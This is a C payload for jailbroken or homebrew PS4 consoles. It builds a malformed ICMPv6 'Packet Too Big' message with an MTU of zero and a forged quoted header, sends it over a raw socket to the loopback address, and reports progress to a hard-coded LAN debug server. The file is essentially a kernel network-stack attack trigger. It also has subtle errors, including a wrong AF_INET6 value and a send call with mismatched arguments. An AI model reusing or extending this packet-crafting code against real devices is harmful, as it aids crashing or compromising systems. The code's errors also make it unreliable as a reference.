#include "ps4.h"

#define AF_INET6        23

#define SOCK_STREAM     1
#define SOCK_DGRAM      2
#define SOCK_RAW        3

#define IPPROTO_ICMP    1
#define IPPROTO_ICMPV6  58

struct in6_addr {
    unsigned char s6_addr[16];
};

struct sockaddr_in6 {
    uint8_t         sin6_len;
    uint8_t         sin6_family;
    uint16_t        sin6_port;
    uint32_t        sin6_flowinfo;
    struct in6_addr sin6_addr;
    uint32_t        sin6_scope_id;
};

#define debug(sock, format, ...)                    \
    do {                                            \
        char buffer[512];                           \
        int size = sprintf(buffer, format, ##__VA_ARGS__); \
        sceNetSend(sock, buffer, size, 0);          \
    } while(0)

int _main(void) {

    initKernel();
    initLibc();
    initNetwork();

    char socketName[] = "debug";

    struct sockaddr_in server;
    server.sin_len = sizeof(server);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = IP(192, 168, 248, 159);
    server.sin_port = sceNetHtons(9023);
    memset(server.sin_zero, 0, sizeof(server.sin_zero));

    int debug_sock = sceNetSocket(socketName, AF_INET, SOCK_STREAM, 0);
    if (debug_sock < 0) {
        return 0;
    }

    if (sceNetConnect(debug_sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        sceNetSocketClose(debug_sock);
        return 0;
    }

    debug(debug_sock, "PID: %d\n", syscall(20));

    int raw6_sock = sceNetSocket("raw_icmp6", AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);

    if (raw6_sock < 0) {
        debug(debug_sock, "Failed to create raw ICMPv6 socket: %d\n", raw6_sock);
        goto cleanup;
    }

    debug(debug_sock, "Raw ICMPv6 socket created successfully: %d\n", raw6_sock);

    struct sockaddr_in6 dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin6_len     = sizeof(dest);
    dest.sin6_family  = AF_INET6;
    dest.sin6_port    = 0;

    const char *target_ip = "::1";
    sceNetInetPton(AF_INET6, target_ip, &dest.sin6_addr.s6_addr);

    uint8_t icmp6_packet[128];
    memset(icmp6_packet, 0, sizeof(icmp6_packet));

    icmp6_packet[0] = 2;
    icmp6_packet[1] = 0;

    uint32_t malformed_mtu = 0x00000000;
    memcpy(icmp6_packet + 4, &malformed_mtu, 4);

    uint8_t *quoted = icmp6_packet + 8;

    quoted[0] = 0x60;
    quoted[1] = 0x00;
    quoted[2] = 0x00; quoted[3] = 0x00;
    quoted[4] = 0x00; quoted[5] = 0x10;
    quoted[6] = 6;
    quoted[7] = 64;

    memset(quoted + 8, 0, 16);
    quoted[8 + 15] = 1;

    memcpy(quoted + 24, &dest.sin6_addr.s6_addr, 16);

    memset(quoted + 40, 0xAA, 16);

    int packet_len = 8 + 40 + 16;

    int sent = sceNetSend(raw6_sock, icmp6_packet, packet_len, 0,
                            (struct sockaddr *)&dest, sizeof(dest));

    if (sent < 0) {
        debug(debug_sock, "sceNetSendto failed: %d\n", sent);
    } else {
        debug(debug_sock, "Malformed ICMPv6 Packet Too Big sent: %d bytes\n", sent);
    }

    sceNetSocketClose(raw6_sock);

cleanup:
    sceNetSocketClose(debug_sock);

    return 0;
}